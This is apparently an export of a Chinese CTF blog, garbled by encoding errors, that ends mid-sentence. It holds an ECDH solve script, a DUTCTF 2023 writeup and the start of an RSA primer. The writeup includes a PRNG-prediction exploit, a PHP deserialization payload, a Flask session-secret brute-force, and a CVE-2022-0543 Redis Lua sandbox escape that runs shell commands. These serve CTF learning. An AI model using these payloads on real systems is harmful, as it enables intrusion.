[{"title":"ECDH-å¯†ç äº¤æ¢æ”»å‡»","url":"/2023/03/11/ECDH/","content":"[NewStarCTF] Week 5 - An der schÃ¶nen Elliptische KurveAnalyzå…ˆä¸Šé¢˜ï¼š\n#task.sagefrom secret import FLAG, ECDH_KEY_EXCHANGEfrom Crypto.Cipher import AESfrom hashlib import md5from os import urandomiv = urandom(16)a = 14489b = 10289p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661F = GF(p)E = EllipticCurve(F, [a, b])G = E.random_point()my_private_key = random_prime(2^256)shared, sender_public_key = ECDH_KEY_EXCHANGE(G, my_private_key)key = md5(str(int(shared.xy()[0])).encode()).digest()cipher = AES.new(key, AES.MODE_CBC, iv)ciphretext = cipher.encrypt(FLAG)print(a)print(b)print(p)print(sender_public_key)print(my_private_key)print(ciphretext.hex())print(iv.hex())\n#output.txt14489102897486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)25495456812197660236899774619860149159465038062538775349151750933063178527732f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23d151c04c645c3e2a8d3f1ae44589ef20\næµ…åˆ†æä¸€ä¸‹task.sageï¼Œæˆ‘ä»¬åªæœ‰sender_public_keyå’Œmy_private_keyï¼Œæ˜¾ç„¶è€ƒå¯Ÿçš„æ˜¯ECDH\n\nECDHç®—æ³•å‡è®¾æœ‰ä¸¤ç«¯ï¼ŒAliceå’ŒBobï¼Œä»–ä»¬æƒ³åœ¨éå®‰å…¨ä¿¡é“ä¸Šå®‰å…¨åœ°äº¤æ¢ä¿¡æ¯ä½†åˆä¸æƒ³è¢«ç¬¬ä¸‰æ–¹è·å–ï¼Œæ­¤æ—¶å¯ä»¥é‡‡ç”¨ECDHå¯†é’¥äº¤æ¢ç®—æ³•\nåŒæ–¹éƒ½çŸ¥é“ECDHç®—æ³•ä¸­çš„ä¸€ä¸ªå¤§ç´ æ•°pï¼Œè¿˜æœ‰ä¸€ä¸ªæ•´æ•°gä½œä¸ºè¾…åŠ©\nAliceç”Ÿæˆç§é’¥aï¼Œå¹¶é€šè¿‡ç”Ÿæˆå…¬é’¥ã€‚Bobç”Ÿæˆç§é’¥bï¼Œç„¶åé€šè¿‡ç”Ÿæˆå…¬é’¥Bï¼Œåœ¨å‘é€Bä¹‹å‰ï¼ŒBobé€šè¿‡ç”Ÿæˆå…¬å…±å¯†é’¥ï¼Œä½†æ˜¯åªå‘é€Bï¼Œè€ŒAliceåœ¨æ¥æ”¶åˆ°Bobçš„å…¬é’¥Bä¹‹åï¼ŒåŒæ ·å¯ä»¥é€šè¿‡æ¥ç”Ÿæˆå…¬å…±å¯†é’¥Kã€‚\n\næ”»å‡»å¯¹äºAliceå’ŒBobæ¥è¯´ï¼Œ\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼Œ\nEXP#Sagefrom hashlib import *from Crypto.Cipher import AESfrom Crypto.Util.number import *a=14489b=10289p=7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661#sender_public_key=(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)my_private_key=2549545681219766023689977461986014915946503806253877534915175093306317852773ciphertext=\"2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23\"iv=\"d151c04c645c3e2a8d3f1ae44589ef20\"F=GF(p)E=EllipticCurve(F,[a,b])sender_public_key=E([1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207,1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459])shared=sender_public_key*my_private_keykey = md5(str(int(shared.xy()[0])).encode()).digest()#iv=int(iv,16)iv=bytes.fromhex(iv)#ciphertext=int(ciphertext,16)ciphertext=bytes.fromhex(ciphertext)cipher=AES.new(key,AES.MODE_CBC,iv)cipher=cipher.decrypt(ciphertext)print(cipher)\n","categories":["CTF"],"tags":["CTF","CRYPTO","ECC","ECDH"]},{"title":"[DUTCTF 2023] Writeup by Z3ds1ch","url":"/2023/03/28/DUTCTF_wp/","content":"[DUTCTF 2023] Writeup by Z3ds1chå°æ‘¸äº†ä¸ªSecondï¼Œå¯æƒœæ²¡æœ‰AK WEBï¼Œå¥½å¥½å­¦ä¹ ä¸‹æ¬¡åŠ æ²¹ï¼Œ&gt;_&lt;\nMisc*ç­¾åˆ°é¢˜åšé¢˜è®°å½•è¢«åˆ äº†qwq\nç›´æ¥bç«™è§†é¢‘ä¸€ä¸ªä¸ªç¿»è¯„è®ºå°±èƒ½æ‰¾åˆ°flag\n*Minecraftwurstclientç›´æ¥xray+flight+fullbrightï¼Œé…åˆé¥¼å›¾æ‰¾éè‡ªç„¶æ–¹å—æ‰¾åˆ°ç®±å­ï¼Œä»ä¹¦ä¸ç¬”ä¸­è·å¾—flag\næˆ‘åœ¨å“ª?ğŸ¥µ\nåœ¨å³ä¸Šè§’å¯ä»¥å‘ç°åå…«ä¸­å’ŒCICï¼Œåˆå·²çŸ¥è¿™æ˜¯æ±Ÿè¾¹ï¼Œæœç´¢è¿™äº›å…³é”®è¯å°±èƒ½æ‰¾åˆ°ç­”æ¡ˆæ›¾å®¶å²©ï¼Œmd5åŠ å¯†å³å¯\nï¼ˆæŸä¸ªç½‘ç«™md5åŠ å¯†åäº†å¥½å‡ å¹´äº†ä¸€ç›´ä¸ä¿®ï¼Œæˆ‘ä¸è¯´æ˜¯è°ï¼Œè¿˜å¾—ç”¨cyberchefï¼‰\nä¸è¦æ›´æ–°ï¼\nåœ¨æµé‡åŒ…é‡Œæœç´¢å­—ç¬¦ä¸²flagï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªGithubçš„Repositoryï¼Œæ‰¾åˆ°è¿™ä¸ªä»“åº“ï¼ˆhttps://github.com/IShiraiKurokoI/Flagï¼‰ï¼Œä»“åº“é‡Œæœ‰`1.0.0`çš„`Release`ç‰ˆæœ¬ï¼Œæ ¹æ®é¢˜ç›®æè¿°**ä¸è¦æ›´æ–°**å¯ä»¥è”æƒ³åˆ°éœ€è¦æ‰¾åˆ°ä¹‹å‰çš„`ç‰ˆæœ¬/æ—¥å¿—`ï¼Œç›´æ¥ä½¿ç”¨`Github`è‡ªå¸¦çš„`compare`åŠŸèƒ½å°±èƒ½æ‰¾åˆ°`flag`ï¼Œä¸€çœ¼å‡¯æ’’ï¼Œç›´æ¥è½¬å°±è¡Œ\n\nez_imgè§£å‹ä¹‹ååªæœ‰ä¸€å¼ å›¾ç‰‡2.png\n\nå…ˆæ‹–è¿›010editorä¸­æ‰«ä¸€çœ¼\n\næ˜¾ç„¶æœ€åä¸€ä¸ªIDATå—æœ‰äº›é—®é¢˜ï¼Œä½†æå–æœ‰äº›å›°éš¾ï¼Œæš‚ä¸”æŒ‰ä¸‹ä¸è¡¨ï¼Œå…ˆçœ‹çœ‹æœ‰æ²¡æœ‰ç®€å•çš„ï¼ŒCtrl+Fæœç´¢å­—ç¬¦ä¸²flagï¼Œæ‰¾åˆ°äº†flagå¤´ï¼Œç›´æ¥Base64 Decodeå³å¯\n\nå†å°è¯•ä¸€ä¸‹æ˜¯ä¸æ˜¯è—ä¸œè¥¿äº†ï¼Œç›´æ¥foremostæ‹†å‡ºæ¥4.pngå’ŒQRcode\n\n\n4.pngçš„flagä¸­é—´ä¸€æ®µç›´æ¥é€äº†ï¼Œæ˜¾ç„¶QRcodeæ˜¯æœ€åä¸€æ®µäº†ï¼Œç›´æ¥è„šæœ¬è½¬æˆäºŒç»´ç å°±è¡Œ\nfrom PIL import Imagefrom gmpy2 import *import sysfrom zlib import *sys.set_int_max_str_digits(0)MAX = 500pic = Image.new(\"RGB\",(MAX,MAX))with open \"QRcode\" as f:    str=f.readline()str=bin(int(str))print(iroot(len(str),2))i=0for y in range(0,MAX):    for x in range(0,MAX):        if(str[i] == '1'):            pic.putpixel([x,y],(0,0,0))        else:pic.putpixel([x,y],(255,255,255))        i = i+1pic.show()pic.save(\"flag.png\")# DUTCTF{3E07747C-E552-EC96-003C-F3DBD9CD6704}\nçœ‹é›ªâ„è‡ªä»é‚£ä¸ªå†¬å¤œçœ‹é›ªï¼Œä¸€æ™ƒå·²æ˜¯äºŒåå¹´ï¼Œå½“å¹´çš„è„šæœ¬å°å­ä»¬éƒ½åœ¨å“ªä¸ªircé¢‘é“èŠå¤©å‘¢ï¼Ÿflagæ ¼å¼ä¸ºDUTCTF{ip:port#é¢‘é“å}\nçœ‹åˆ°é¢˜ç›®æè¿°èƒ½åˆ¤æ–­å‡ºæ˜¯è¦ç¤¾å·¥å‡ºçœ‹é›ªè®ºå›çš„ircé¢‘é“ï¼Œå…ˆå»bbs.kanxue.comæ‰¾ä¸€ä¸‹çº¿ç´¢\n\nå°è¯•äº†ä¸€ä¸‹æœç„¶ä¸å¯¹ï¼Œä½¿ç”¨æ–¹æ³•ç»™çš„è¿æ¥ä¹Ÿæ— æ•ˆäº†ï¼Œè”æƒ³åˆ°ä¹‹å‰æœ‰ä¸€ç¯‡è®²çœ‹é›ªåˆ›å§‹çš„æ–°é—»https://zhuanlan.zhihu.com/p/23831052ï¼Œæ ‡é¢˜æ˜¯è‡ªä»é‚£ä¸ªå†¬å¤œçœ‹é›ªï¼Œä¸€æ™ƒå·²æ˜¯åå…­å¹´ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯è¦æ‰¾2003å¹´å·¦å³çš„ircé¢‘é“ï¼Œå†ç»§ç»­å¾€ä¸‹ç¿»è®ºå›çš„è¯„è®ºåŒºå¯ä»¥è¯å®æˆ‘ä»¬çš„çŒœæƒ³\n\nå›ä¸»è¯´åœ¨ä¸‰å››å¹´å‰ï¼ˆ2002/2003ï¼‰ç¡®å®æœ‰è¿‡ircé¢‘é“ï¼Œä½†æˆ‘ä»¬åœ¨ç°åœ¨çš„è®ºå›é‡Œæ‰¾ä¸åˆ°å½“æ—¶çš„è®°å½•äº†ï¼Œå¯èƒ½æ˜¯æ—¶é—´è¿‡ä¹…è¢«åˆ é™¤æˆ–æ˜¯å› ä¸ºå…¶ä»–åŸå› ä¸è§äº†ï¼Œåœ¨https://www.pediy.com/kssd/pediy05/pediy50326.htmé‡Œå¯ä»¥æ‰¾åˆ°ä¸€äº›ä¹‹å‰çš„å¸–å­ï¼Œä½†å¾ˆå¤šå¸–å­è¿˜æ˜¯å¤±æ•ˆäº†ï¼Œæ‰¾äº†å¾ˆä¹…è¿˜æ˜¯æ— æœï¼Œæ‰€ä»¥åªèƒ½å°è¯•ç”¨ç½‘é¡µå¿«ç…§æ¥æ¢å¤ã€‚ä½†å¾ˆå¯æƒœç™¾åº¦å¿«ç…§ã€Googleå¿«ç…§ç­‰ç­‰åŠŸèƒ½éƒ½è¢«å…³é—­äº†ï¼Œå›½å†…çš„å¿†å¾€æ˜”ä¿å­˜çš„ç½‘é¡µå†å²å¿«ç…§æœ€æ—©åªæœ‰2022å¹´ï¼Œåœ¨ä¸€ç•ªæœç´¢ä¸‹æ‰¾åˆ°äº†WayBackMachine:archive.orgï¼Œæœç´¢ä¹‹å‰å‘ç°çš„å¤±æ•ˆçš„åœ°å€www.pediy.com/irc.htmå¯ä»¥æ‰¾åˆ°å½“æ—¶çš„è®°å½•\n\néšä¾¿ç‚¹å¼€ä¸€ç¯‡æœ€å¼€å¤´å°±èƒ½æ‰¾åˆ°ç­”æ¡ˆäº†\n\n\nREVERSE*è´ªåƒè›‡æ‹–è¿›idaé‡Œç›´æ¥Shift+F12å°±èƒ½æ‰¾åˆ°flagäº†\nGAME!ä¸‹æ£‹å°±è¡Œï¼ˆä¸ºäº†å¸®å¿™æµ‹è¯•æ–°é™„ä»¶å¯¹ä¸å¯¹åˆé‡ä¸‹äº†ä¸€éï¼‰\n\n\nezdrawæ‹–è¿›idaé‡ŒæŒ‰ç©ºæ ¼ä¼šæŠ¥é”™The graph is too large to be displayedï¼Œæœç´¢è§£å†³æ–¹æ¡ˆåå†æŒ‰ç©ºæ ¼å°±èƒ½çœ‹åˆ°flagäº†\n\n\nCRYPTOä¸Šæ¬¡AKäº†CRYPTOï¼Œç°åœ¨æ­£åœ¨è½¬WEBçš„é€”ä¸­ï¼Œéš¾é¢˜éƒ½æ²¡å‡ºï¼Œåªèƒ½è¯´è€æœ¬è¡Œæ‰‹ç”Ÿäº†\n*è€æ»šäº”ç›´æ¥é¾™è¯­ç¿»è¯‘å³å¯\n*ç¥å¥‡çš„çŸ­ä¿¡å› ä¸ºé¢˜ç›®ä¿¡æ¯æ˜¯è¯ºåŸºäºšï¼Œé¢˜ç›®æè¿°é‡Œåˆè¯´æ˜¯å…¨å¤§å†™å­—æ¯ï¼Œå¯ä»¥è”æƒ³åˆ°æ˜¯é”®ç›˜è¾“å…¥å­—æ¯\nå…¶å®æ˜¯çŒœçš„ï¼Œäº”ä½å…¨å­—æ¯æ˜¾ç„¶æ˜¯é˜Ÿåå•Šqwq\nshamirâ€‹        shamiråŸºæœ¬åŸç†\nâ€‹        å‡è®¾æˆ‘ä»¬å­˜åœ¨ä¸€ä¸ªç§˜å¯†Sï¼ŒæŠŠç§˜å¯†Sè¿›è¡Œç‰¹å®šè¿ç®—ï¼Œå¾—åˆ°wä¸ªç§˜å¯†ç¢ç‰‡ï¼Œäº¤ç»™wä¸ªäººä¿å­˜ï¼Œå½“è‡³å°‘tä¸ªäººåŒæ—¶æ‹¿å‡ºè‡ªå·±æ‰€æ‹¥æœ‰çš„ç§˜å¯†ç¢ç‰‡æ—¶ï¼Œå³å¯è¿˜åŸå‡ºæœ€åˆçš„ç§˜å¯†Sã€‚\nâ€‹        ç§˜å¯†ç¢ç‰‡ç”Ÿæˆï¼š\nâ€‹        æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªå¤šé¡¹å¼ï¼šï¼Œå…¶ä¸­ï¼Œsæ˜¯æˆ‘ä»¬çš„ç§˜å¯†ï¼Œpæ˜¯ä¸€ä¸ªç´ æ•°ï¼Œè€Œä¸”æ»¡è¶³ï¼Œå–wä¸ªä¸ç›¸ç­‰çš„xï¼Œä»£å…¥ä¸­ï¼Œå¾—åˆ°wç»„ï¼Œåˆ†é…ç»™wä¸ªäººï¼Œå…¬å¼€pï¼Œé”€æ¯å¤šé¡¹å¼ï¼Œæ¯ä¸ªäººè´Ÿè´£ä¿å¯†è‡ªå·±çš„\nâ€‹        ç§˜å¯†æ¢å¤\nâ€‹        å½“æ—¶ï¼Œï¼Œå³å¯æ¢å¤sï¼Œå°†iç»„å¸¦å…¥ä¸‹é¢è¿™ä¸ªå¼å­å³å¯ï¼Œ\nEXPimport Crypto.Util.number as numbimport randomdef oj(a, n):    a = a % n    s = [0, 1]    while a != 1:        if a == 0:            return 0        q = n // a        t = n % a        n = a        a = t        s += [s[-2] - q * s[-1]]    return s[-1]def create(max_length=513, secret_is_text=0, p=0):    if not p:        p = numb.getPrime(max_length)    w = int(input(\"è¯·è¾“å…¥ç§˜å¯†ä¿å­˜äººæ•°ï¼š\"))    t = int(input(\"è¯·è¾“å…¥ç§˜å¯†æ¢å¤æ‰€éœ€äººæ•°ï¼š\"))    while not (t &gt; 0 and t &lt;= w):        t = int(input(\"è¯·é‡æ–°è¾“å…¥ï¼š\"))    s = input(\"è¯·è¾“å…¥ä½ çš„ç§˜å¯†:\")    if secret_is_text:        s = numb.bytes_to_long(s.encode(\"utf-8\"))    else:        try:            s = int(s)        except Exception as e:            s = numb.bytes_to_long(s.encode(\"utf-8\"))    x_list = list()    a_list = list()    i = w    while i &gt; 0:        x = random.randint(p // 2, p)        if x not in x_list:            x_list.append(x)            i -= 1    for a in range(t):        a_list.append(random.randint(p // 2, p))    result = list()    for x in x_list:        y = s        for a_n in range(t):            a = a_list[i]            y += a * pow(x, i + 1, p)        result.append((x, y))    return t, p, resultdef restore(p, information, get_text=1):    x_list = list()    y_list=list()    for x, y in information:        x_list.append(x)        y_list.append(y)    s = 0    for x_i in range(len(x_list)):        tmp_num = y_list[x_i]        x_i_j = 1        for x_j in range(len(x_list)):            if x_i != x_j:                tmp_num = tmp_num * (0 - x_list[x_j]) % p                x_i_j *= x_list[x_i] - x_list[x_j]        tmp_num = tmp_num * oj(x_i_j, p) % p        s += tmp_num    s = s % p    print(s)    if get_text:        try:            s = numb.long_to_bytes(s)            s = s.decode(\"utf-8\")        except Exception as e:            print(e)    return st, p, result = create() print(result)print(restore(p, result[:t])) \néšæœºæ•°çš„åŠ›é‡çœ‹é¢˜ç›®å‘ç°å’Œå»å¹´SSSCTF 2022ä¸€æ ·ï¼Œæ‰€ä»¥çŒœæµ‹è¿˜æ˜¯å’Œé¢„æµ‹éšæœºæ•°æœ‰å…³ï¼Œå…ˆçœ‹ä¸€ä¸‹task.pyï¼Œå”¯ä¸€æœ‰ç”¨çš„æ˜¯ä¸‹é¢è¿™ä¸€æ®µ\ndef handle(self):    self.send(b'welcome to this guess game!')    self.send(b'please tell me your name:', newline=False)    name = self.recv()    if bytes_to_long(name).bit_length() &lt;= 32:        self.send(b'flag')        exit()    self.send(b'Let\\'s guess!')    while True:        guess = random.randint(0, bytes_to_long(name))        self.send(b'&gt;', newline=False)        if int(self.recv().decode()) == guess:            self.send(flag)        else:            self.send(b'sorry, but the num is:', newline=False)            self.send(str(guess).encode())\næˆ‘ä»¬éœ€è¦å‘é€ä¸€ä¸ªnameï¼Œä¸”æ»¡è¶³bytes_to_long(name).nbit_length()&gt;32ï¼ŒéšåæœåŠ¡ç«¯ä¼šè°ƒç”¨randint()å‡½æ•°ï¼Œä»0åˆ°bytes_to_long(name)ä¸­éšæœºç”Ÿæˆä¸€ä¸ªæ•°è®©æˆ‘ä»¬è¿›è¡ŒçŒœæµ‹\né¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼ŒPythonä¸­çš„randomæ¨¡å—æ˜¯å¯ä»¥äººä¸ºç ´è§£çš„ï¼Œå…¶åº•å±‚æ˜¯ä½¿ç”¨æ¢…æ£®æ—‹è½¬ç®—æ³•æ¥ç”Ÿæˆä¼ªéšæœºæ•°åºåˆ—ï¼Œå¯ä»¥å…ˆå»äº†è§£ä¸€ä¸‹ï¼šhttps://blog.csdn.net/tianshan2010/article/details/83247000ï¼Œç”±äºç”Ÿæˆç®—æ³•å·²çŸ¥ï¼Œæ‰€ä»¥å¯ä»¥äººä¸ºé¢„æµ‹ï¼Œå¯ä»¥é‡‡ç”¨çš„pythonåº“æœ‰Python-random-module-crackerå’Œmersenne-twister-predictorï¼Œè™½ç„¶å‰è€…å¯ä»¥ç›´æ¥é¢„æµ‹randint()ï¼Œä½†åªèƒ½é¢„æµ‹(0,4294967294)è¿™ä¸ªèŒƒå›´å†…çš„æ•°ï¼Œæ‰€ä»¥è¦ç”¨åè€…ï¼Œä½†å®˜æ–¹æä¾›çš„åªæœ‰getrandbits()ã€‚æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹getrandbits()çš„æºç ï¼Œå¯ä»¥å‘ç°ä¸€æ¡åˆ©ç”¨é“¾ï¼šå®é™…ä¸Šrandint(a,b)å‡½æ•°è¿”å›å€¼çš„ç”Ÿæˆè¿‡ç¨‹ï¼Œæ˜¯è°ƒç”¨randrange(a,b+1)å‡½æ•°ã€‚è€Œrandrange(a,b+1)å‡½æ•°æ˜¯å…ˆè·å–å®½åº¦width=b+1-aï¼Œç„¶åå½“å®½åº¦å¤§äºæœ€å¤§å®½åº¦æ—¶ï¼Œè°ƒç”¨a+_randbelow(width)å‡½æ•°ã€‚è€Œ_randbelow(width)å‡½æ•°ï¼Œé¦–å…ˆè®¡ç®—k = _int(1.00001 + _log(n-1, 2.0))ï¼Œç›¸å½“äºè®¡ç®—widthè½¬åŒ–æˆäºŒè¿›åˆ¶ä½æœ‰å¤šå°‘ä½ï¼Œç„¶ååœ¨è°ƒç”¨getrandbits(k)ã€‚ç”±äºé¢„æµ‹32ä½çš„éšæœºæ•°éœ€è¦ä¼ 624ä¸ªå‚æ•°ï¼Œç®€å•æ¨å¯¼ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ä¼ 312ä¸ªå‚æ•°å°±å¯ä»¥é¢„æµ‹64ä½çš„éšæœºæ•°\nEXPimport randomfrom mt19937predictor import MT19937Predictorpredictor = MT19937Predictor()name_num=2**64-2name=long_to_bytes(name_num)io=remote(\"210.30.97.133\",28044)io.recvuntil(b'please tell me your name:')io.sendline(name)for i in range (312):    print(\"Times: \",i)    io.recvuntil(b'&gt;')    io.sendline(b'1')    io.recvuntil(b'sorry, but the num is:')    num = io.recvline()    num = int(num)    # print(num)    predictor.setrandbits(num,64)io.recvuntil(b'&gt;')predict_num=bytes(str(predictor.getrandbits(64)).encode())# print(predict_num)io.sendline(predict_num)print(io.recvline())\n\nPWN*ä¸­é—´äººç®€å•çš„æ»šåŠ¨ç å¼€è½¦é—¨ï¼Œinterceptä¹‹åå‘é€ä¸‹ä¸€æ¬¡çš„ä¿¡å·å°±èƒ½å¼€é—¨äº†\n\nWEBéå¸¸çš„å¯æƒœæ²¡æœ‰AKï¼Œè½¬WEBæ²¡å¤šä¹…ï¼Œsqlè¿˜æ²¡æ€ä¹ˆå­¦ï¼Œæœç„¶è¿˜æ˜¯ä¸èƒ½æ€¥äºæ±‚æˆ\nembryo_webBurpSuiteæŠ“ä¸ªåŒ…çœ‹æ³¨é‡Šå°±æœ‰flagäº†\n*Trenjaç›´æ¥ç©ä¸¤ä¸ªå°æ¸¸æˆå°±èƒ½å‡ºflagï¼Œä½†è¿˜æ˜¯æ¯”è¾ƒæ¨èç¿»jsçš„æºç \nbabyphpç®€å•çš„phpååºåˆ—åŒ–ï¼Œéšæ‰‹æ„é€ ä¸ªé“¾å­å°±è¡Œï¼šUser-&gt;__destruct()-&gt;Info-&gt;update()-&gt;win()\nPOC$a='O:4:\"User\":3:{s:4:\"name\";s:5:\"admin\";s:6:\"passwd\";N;s:4:\"info\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:5:\"admin\";s:8:\"birthday\";N;}}';\nfake_sessionå…ˆä¸Šé¢˜\nfrom flask import Flask, sessionimport randomimport my_secretapp = Flask(__name__)app.config['SECRET_KEY'] = my_secret.my_secret()@app.route('/')def hello_world():    if not session.get('user'):        session['user'] = ''.join(random.choices(\"23333\", k=5))    return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin():    if session.get('user') != \"admin\":        return \"you are not admin!go away\"    else:        flag = ''        with open('/flag', 'r') as f:            for line in f:                flag += line        return 'Congratulations! You logged in as admin. Here is the flag:{}'.format(flag)if __name__ == '__main__':    app.run(host='0.0.0.0', port=8080)\næ˜¾ç„¶æ˜¯ä¼ªé€ sessionçš„é¢˜ï¼Œcookieé‡Œç”¨flask_unsignç›´æ¥ä¼ªé€ å°±è¡Œï¼Œæˆ‘ä»¬æ²¡æœ‰secretï¼Œä½†æç¤ºäº†æ˜¯å¼±å£ä»¤ï¼Œè‡ªå·±å†™ä¸ªå­—å…¸çˆ†ç ´ä¸€ä¸‹å°±èƒ½å‡º\nimport stringimport flask_unsigntable = string.ascii_letters + string.digits# s = string.digits# s=[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\"]index=[]for s1 in table:    for s2 in table:        for s3 in table:                s=s1+s2+s3                index.append(s)l=len(index)with open (\"index.txt\",mode=\"w\") as f:    for i in range (l):        if (i%10000==0):            print(\"times:\",i)        f.write(\"\\\"\")        f.write(index[i])        f.write(\"\\\"\\n\")\nçˆ†ç ´ä¸€ä¸‹secret\nPS C:\\&gt; flask-unsign --unsign --cookie 'eyJ1c2VyIjoiMzMyMjMifQ.ZCBOug.JAGEY2qy_y_fzPhWoQWYw95jSf4' --wordlist \"index.txt\"[*] Session decodes to: {'user': '33223'}[*] Starting brute-forcer with 8 threads..[+] Found secret key after 216448 attempts'4rc'\nç„¶åä¼ªé€ ä¸€ä¸‹æ•°å­—ç­¾åï¼Œç”¨cookie edioræ”¹ä¸€ä¸‹cookieå°±å¯ä»¥äº†\ncveå»å¹´[è™ç¬¦CTF 2022] Quest-RCEåŸé¢˜ï¼Œåˆ©ç”¨äº†CVE-2022-0543æ¥è¿›è¡Œæ²™ç›’é€ƒé€¸\nlocal io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\");local io = io_l();local f = io.popen(\"id\", \"r\");local res = f:read(\"*a\");f:close();return res---åœ¨\"id\"è¿›è¡Œè¿™é‡Œæ¶æ„ä»£ç æ³¨å…¥\nè¯»ä¸€ä¸‹æºç å‘ç°æœ‰base64.StdEncoding.DecodeString(custom)ï¼Œæ‰€ä»¥payloadè¦è¿›è¡Œä¸€æ¬¡Base64åŠ å¯†\nPOST doCustomè·¯ç”±ï¼Œå¯¹customä¼ å‚payloadå°±è¡Œ\n","categories":["CTF"],"tags":["CTF","CRYPTO","DUTCTF 2023","MISC","PWN","WEB"]},{"title":"Do u know RSA?","url":"/2023/03/22/RSA/","content":"RSAæ¦‚è¿°RSAæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œåœ¨å…¬å¼€å¯†é’¥åŠ å¯†å’Œç”µå­å•†ä¸šä¸­RSAè¢«å¹¿æ³›ä½¿ç”¨ã€‚å…¬é’¥ï¼ˆPublic Keyï¼‰ä¸ç§é’¥ï¼ˆPrivate Keyï¼‰æ˜¯é€šè¿‡ä¸€ç§ç®—æ³•å¾—åˆ°çš„ä¸€ä¸ªå¯†é’¥å¯¹ï¼ˆå³ä¸€ä¸ªå…¬é’¥å’Œä¸€ä¸ªç§é’¥ï¼‰ï¼Œå…¬é’¥æ˜¯å¯†é’¥å¯¹ä¸­å…¬å¼€çš„éƒ¨åˆ†ï¼Œç§é’¥åˆ™æ˜¯éå…¬å¼€çš„éƒ¨åˆ†ã€‚å…¬é’¥é€šå¸¸ç”¨äºåŠ å¯†ä¼šè¯å¯†é’¥ã€éªŒè¯æ•°å­—ç­¾åï¼Œæˆ–åŠ å¯†å¯ä»¥ç”¨ç›¸åº”çš„ç§é’¥è§£å¯†çš„æ•°æ®ã€‚\né¢„å¤‡çŸ¥è¯†æ¨¡è¿ç®— modåœ¨æ­£æ•´æ•°èŒƒå›´å†…é€‰å–aï¼Œbï¼Œåˆ†åˆ«å¯¹å¦ä¸€ä¸ªæ­£æ•´æ•°nè¿›è¡Œå–ä½™è¿ç®—ï¼Œå¾—åˆ°ï¼Œï¼Œå¦‚æœï¼Œåˆ™ç§°aä¸bå…³äºnåŒä½™ï¼Œè®°ä½œ\næ¨¡é€†è¿ç®—å¦‚æœæ­£æ•´æ•°aï¼Œbï¼Œnæ»¡è¶³ï¼Œåˆ™ç§°aä¸bäº’ä¸ºæ¨¡nçš„é€†å…ƒï¼Œè®°ä½œ\npythonå®ç°ï¼š\nfrom gmpy2 import *a = 114514n = 1919810b = invert(a,n)#bå³ä¸ºaå…³äºnçš„é€†å…ƒ\nå…¶ä½™æ¨¡è¿ç®—åŸºæœ¬åŸç†å¯ä»¥å‚ç…§è¿™ç¯‡æ–‡ç« ï¼šhttps://blog.sengxian.com/algorithms/mod-world\næ¬§æ‹‰å‡½æ•° phiçš„å€¼è¡¨ç¤ºå°äºç­‰äºnçš„æ­£æ•´æ•°ä¹‹ä¸­ï¼Œæœ‰å¤šå°‘ä¸ªæ•°ä¸næ„æˆäº’è´¨å…³ç³»ã€‚\n1.è‹¥ï¼Œåˆ™ï¼Œå› ä¸º1ä¸ä»»ä½•æ•°éƒ½æ„æˆäº’è´¨å…³ç³»\n2.è‹¥ä¸ºè´¨æ•°ï¼Œåˆ™ï¼Œå› ä¸ºä»»ä½•ä¸€ä¸ªè´¨æ•°ä¸å°äºå®ƒçš„æ‰€æœ‰æ•°éƒ½æ„æˆäº’è´¨å…³ç³»\n3.è‹¥ï¼Œå…¶ä¸­pä¸ºè´¨æ•°ï¼Œåˆ™\n4.è‹¥å¯ä»¥åˆ†è§£æˆä¸¤ä¸ªäº’è´¨çš„æ•´æ•°ä¹‹ç§¯ï¼Œå³nï¼Œåˆ™ã€‚\næ¬§æ‹‰å®šç†è‹¥ä¸¤ä¸ªæ­£æ•´æ•°aå’Œnäº’è´¨ï¼Œåˆ™nçš„æ¬§æ‹‰å‡½æ•°  å¯ä»¥è®©ä¸‹é¢çš„ç­‰å¼æˆç«‹ï¼šå½“nä¸ºè´¨æ•°æ—¶ï¼Œæ¬§æ‹‰å®šç†å¯ä»¥åŒ–ä¸ºï¼š è¿™å°±æ˜¯è´¹é©¬å°å®šç†ï¼Œå®ƒæ˜¯æ¬§æ‹‰å®šç†çš„ç‰¹ä¾‹ã€‚\n\nHow to ENCRYPT?1.é¦–å…ˆï¼Œæˆ‘ä»¬é€‰å–ä¸¤ä¸ªä¸ç›¸åŒçš„å¤§ç´ 